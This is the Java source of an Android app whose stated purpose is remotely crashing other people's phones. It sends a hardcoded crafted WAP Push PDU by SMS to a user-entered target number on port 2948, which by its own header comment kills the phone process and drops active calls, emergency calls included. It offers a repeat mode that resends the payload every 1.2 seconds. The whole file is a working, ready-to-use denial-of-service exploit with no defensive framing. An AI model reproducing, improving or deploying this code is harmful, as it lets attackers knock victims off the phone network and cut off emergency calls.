package com.markb.wappushcrash;

import android.Manifest;
import android.app.Activity;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.os.Vibrator;
import android.os.VibrationEffect;
import android.telephony.SmsManager;
import android.telephony.SubscriptionInfo;
import android.telephony.SubscriptionManager;
import android.text.method.ScrollingMovementMethod;
import android.view.View;
import android.widget.AdapterView;
import android.widget.ArrayAdapter;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Spinner;
import android.widget.TextView;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;
import java.util.Locale;

/**
 * WAP Push Remote Modem Crash
 *
 * Sends a crafted 8-byte WAP Push PDU to a target phone number on port 2948.
 * Triggers NegativeArraySizeException in WapPushOverSms.decodeWapPdu line 244
 * → uncaught in InboundSmsHandler.processMessagePart → kills com.android.phone
 * → CS_DEATH on any active call (including emergency).
 */
public class MainActivity extends Activity {

    private static final byte[][] PRESET_PDUS = {
        {0x01, 0x06, (byte) 0x88, (byte) 0x80, (byte) 0x80, (byte) 0x80, 0x00, (byte) 0xBE} // 2948 Modem Panic
    };

    private static final String ACTION_SMS_SENT = "com.markb.wappushcrash.SMS_SENT";
    private static final String ACTION_SMS_DELIVERED = "com.markb.wappushcrash.SMS_DELIVERED";

    private EditText phoneInput;
    private Spinner senderSpinner;
    private Spinner profileSpinner;
    private EditText customHexInput;
    private TextView status;
    private Button repeatBtn;
    private List<SubscriptionInfo> subs;

    private boolean isRepeating = false;
    private final Handler repeatHandler = new Handler(Looper.getMainLooper());
    private Runnable repeatRunnable;
    private int repeatCount = 0;

    private BroadcastReceiver smsSentReceiver;
    private BroadcastReceiver smsDeliveredReceiver;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        phoneInput = findViewById(R.id.phoneInput);
        senderSpinner = findViewById(R.id.senderSpinner);
        profileSpinner = findViewById(R.id.profileSpinner);
        customHexInput = findViewById(R.id.customHexInput);
        status = findViewById(R.id.status);
        status.setMovementMethod(new ScrollingMovementMethod());
        status.setOnTouchListener((v, event) -> {
            v.getParent().requestDisallowInterceptTouchEvent(true);
            if ((event.getAction() & android.view.MotionEvent.ACTION_MASK) == android.view.MotionEvent.ACTION_UP) {
                v.getParent().requestDisallowInterceptTouchEvent(false);
            }
            v.performClick();
            return false;
        });

        Button sendBtn = findViewById(R.id.sendBtn);
        repeatBtn = findViewById(R.id.repeatBtn);

        sendBtn.setOnClickListener(v -> sendCrashSms());
        repeatBtn.setOnClickListener(v -> toggleRepeat());

        String[] profiles = {
            "WAP Push Port 2948 (Modem Panic)",
            "Custom Hex PDU"
        };
        ArrayAdapter<String> profileAdapter = new ArrayAdapter<>(this, android.R.layout.simple_spinner_item, profiles);
        profileAdapter.setDropDownViewResource(android.R.layout.simple_spinner_dropdown_item);
        profileSpinner.setAdapter(profileAdapter);

        // Custom hex input is now always visible for direct entry or fuzzer testing.

        // Register SMS delivery & sent receivers
        smsSentReceiver = new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                String ts = new SimpleDateFormat("HH:mm:ss.SSS", Locale.US).format(new Date());
                if (getResultCode() == Activity.RESULT_OK) {
                    appendLog("[" + ts + "] [✓] RADIO STACK: SMS Dispatch Confirmed");
                } else {
                    appendLog("[" + ts + "] [X] RADIO STACK: Send Failed (Result: " + getResultCode() + ")");
                }
            }
        };

        smsDeliveredReceiver = new BroadcastReceiver() {
            @Override
            public void onReceive(Context context, Intent intent) {
                String ts = new SimpleDateFormat("HH:mm:ss.SSS", Locale.US).format(new Date());
                if (getResultCode() == Activity.RESULT_OK) {
                    appendLog("[" + ts + "] [!] CARRIER ACK: WAP PUSH DELIVERED TO TARGET HANDSET");
                } else {
                    appendLog("[" + ts + "] [?] Carrier Delivery Pending / Unconfirmed (Result: " + getResultCode() + ")");
                }
            }
        };

        int receiverFlags = android.os.Build.VERSION.SDK_INT >= 33 ? Context.RECEIVER_EXPORTED : 0;
        registerReceiver(smsSentReceiver, new IntentFilter(ACTION_SMS_SENT), receiverFlags);
        registerReceiver(smsDeliveredReceiver, new IntentFilter(ACTION_SMS_DELIVERED), receiverFlags);

        requestPermissions(new String[] {
            Manifest.permission.SEND_SMS,
            Manifest.permission.READ_PHONE_NUMBERS,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.VIBRATE
        }, 1);

        populateSubs();
    }

    private byte[] getActivePdu() {
        String customHex = customHexInput.getText().toString().trim();
        if (!customHex.isEmpty()) {
            return parseHexBytes(customHex);
        }
        return PRESET_PDUS[0];
    }

    private byte[] parseHexBytes(String hexStr) {
        if (hexStr == null || hexStr.trim().isEmpty()) return PRESET_PDUS[0];
        String clean = hexStr.replaceAll("[^0-9A-Fa-f]", "");
        if (clean.length() % 2 != 0) clean = "0" + clean;
        byte[] data = new byte[clean.length() / 2];
        for (int i = 0; i < data.length; i++) {
            try {
                data[i] = (byte) Integer.parseInt(clean.substring(i * 2, i * 2 + 2), 16);
            } catch (Exception ignored) {}
        }
        return data.length > 0 ? data : PRESET_PDUS[0];
    }

    private String bytesToHex(byte[] bytes) {
        StringBuilder sb = new StringBuilder();
        for (byte b : bytes) {
            sb.append(String.format("%02X ", b));
        }
        return sb.toString().trim();
    }

    private void setLog(String message) {
        status.setText(message);
        scrollToBottom();
    }

    private void appendLog(String message) {
        status.append("\n" + message);
        if (isRepeating) {
            scrollToBottom();
        }
    }

    private void scrollToBottom() {
        if (status != null) {
            status.post(() -> {
                if (status.getLayout() != null) {
                    int scrollAmount = status.getLayout().getLineTop(status.getLineCount()) - status.getHeight();
                    status.scrollTo(0, Math.max(0, scrollAmount));
                }
            });
        }
    }

    @Override
    protected void onDestroy() {
        super.onDestroy();
        stopRepeating();
        if (smsSentReceiver != null) unregisterReceiver(smsSentReceiver);
        if (smsDeliveredReceiver != null) unregisterReceiver(smsDeliveredReceiver);
    }

    @Override
    protected void onPause() {
        super.onPause();
        stopRepeating();
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        populateSubs();
    }

    private void populateSubs() {
        try {
            SubscriptionManager sm = (SubscriptionManager)
                getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE);
            if (sm == null) return;

            if (checkSelfPermission(Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
                setLog("Grant READ_PHONE_STATE for SIM enumeration.");
                return;
            }

            subs = sm.getActiveSubscriptionInfoList();
            if (subs == null || subs.isEmpty()) {
                setLog("No active SIMs found.");
                return;
            }

            String[] items = new String[subs.size()];
            for (int i = 0; i < subs.size(); i++) {
                SubscriptionInfo s = subs.get(i);
                items[i] = "subId " + s.getSubscriptionId()
                    + " — " + s.getDisplayName()
                    + " (slot " + s.getSimSlotIndex() + ")";
            }
            ArrayAdapter<String> adapter = new ArrayAdapter<>(this,
                android.R.layout.simple_spinner_item, items);
            adapter.setDropDownViewResource(android.R.layout.simple_spinner_dropdown_item);
            senderSpinner.setAdapter(adapter);

            setLog("System initialized. Telephony radio ready. Awaiting command.");
        } catch (SecurityException e) {
            setLog("SecurityException reading subscriptions: " + e.getMessage());
        } catch (Exception e) {
            setLog("SIM load error: " + e.getMessage());
        }
    }

    private void toggleRepeat() {
        if (isRepeating) {
            stopRepeating();
        } else {
            startRepeating();
        }
    }

    private void startRepeating() {
        String dest = phoneInput.getText().toString().trim();
        if (dest.isEmpty()) {
            setLog("Enter target phone number first.");
            return;
        }
        if (checkSelfPermission(Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED) {
            setLog("SEND_SMS not granted.");
            return;
        }
        if (subs == null || subs.isEmpty()) {
            setLog("No SIM info available — re-grant READ_PHONE_STATE.");
            return;
        }

        isRepeating = true;
        repeatCount = 0;
        repeatBtn.setText("STOP");

        setLog("[ >>> REPEAT SIGNAL STREAM ACTIVE <<< ]\n  Target MSISDN: " + dest + "\n  Interval: 1200ms");

        repeatRunnable = new Runnable() {
            @Override
            public void run() {
                if (!isRepeating) return;
                boolean success = executeSend(false);
                if (success) {
                    repeatCount++;
                    String ts = new SimpleDateFormat("HH:mm:ss.SSS", Locale.US).format(new Date());
                    appendLog("[" + ts + "] Repeat PDU dispatched (Packet #" + repeatCount + ")");
                }
                repeatHandler.postDelayed(this, 1200);
            }
        };
        repeatHandler.post(repeatRunnable);
    }

    private void stopRepeating() {
        if (!isRepeating) return;
        isRepeating = false;
        if (repeatRunnable != null) {
            repeatHandler.removeCallbacks(repeatRunnable);
        }
        if (repeatBtn != null) {
            repeatBtn.setText("REPEAT");
        }
        appendLog("[ REPEAT SIGNAL HALTED. Total Packets Dispatched: " + repeatCount + " ]");
    }

    private void sendCrashSms() {
        executeSend(true);
    }

    private boolean executeSend(boolean updateStatus) {
        String dest = phoneInput.getText().toString().trim();
        if (dest.isEmpty()) {
            if (updateStatus) setLog("Enter target phone number first.");
            return false;
        }
        if (checkSelfPermission(Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED) {
            if (updateStatus) setLog("SEND_SMS not granted.");
            return false;
        }
        if (subs == null || subs.isEmpty()) {
            if (updateStatus) setLog("No SIM info available — re-grant READ_PHONE_STATE.");
            return false;
        }
        try {
            int pos = senderSpinner.getSelectedItemPosition();
            if (pos < 0 || pos >= subs.size()) pos = 0;
            SubscriptionInfo subInfo = subs.get(pos);
            int subId = subInfo.getSubscriptionId();
            int slotIdx = subInfo.getSimSlotIndex();
            CharSequence carrierName = subInfo.getDisplayName();

            byte[] pdu = getActivePdu();
            int pduPort = 2948; // Port 2948 is the specific WAP Push panic vector

            PendingIntent sentPI = PendingIntent.getBroadcast(this, 0, new Intent(ACTION_SMS_SENT), PendingIntent.FLAG_IMMUTABLE);
            PendingIntent deliveredPI = PendingIntent.getBroadcast(this, 0, new Intent(ACTION_SMS_DELIVERED), PendingIntent.FLAG_IMMUTABLE);

            SmsManager mgr = getSystemService(SmsManager.class).createForSubscriptionId(subId);
            mgr.sendDataMessage(dest, null, (short) pduPort, pdu, sentPI, deliveredPI);

            // Trigger vibration on successful send
            Vibrator vibrator = getSystemService(Vibrator.class);
            if (vibrator != null) {
                vibrator.vibrate(VibrationEffect.createOneShot(250, VibrationEffect.DEFAULT_AMPLITUDE));
            }

            if (updateStatus) {
                String ts = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss.SSS", Locale.US).format(new Date());
                String profileName = profileSpinner.getSelectedItem().toString();
                setLog(
                    "[" + ts + "] TELEMETRY DISPATCH\n" +
                    "  Target MSISDN: " + dest + "\n" +
                    "  Transmitter SIM: " + carrierName + " (subId " + subId + ", slot " + slotIdx + ")\n" +
                    "  Attack Profile: " + profileName + "\n" +
                    "  Port: " + pduPort + "\n" +
                    "  PDU Hex: " + bytesToHex(pdu) + "\n" +
                    "  Status: Dispatched to Radio Layer. Awaiting carrier delivery receipt..."
                );
            }
            return true;
        } catch (SecurityException e) {
            if (updateStatus) setLog("SecurityException on send: " + e.getMessage());
            return false;
        } catch (Exception e) {
            if (updateStatus) setLog("Send error: " + e.getMessage());
            return false;
        }
    }
}
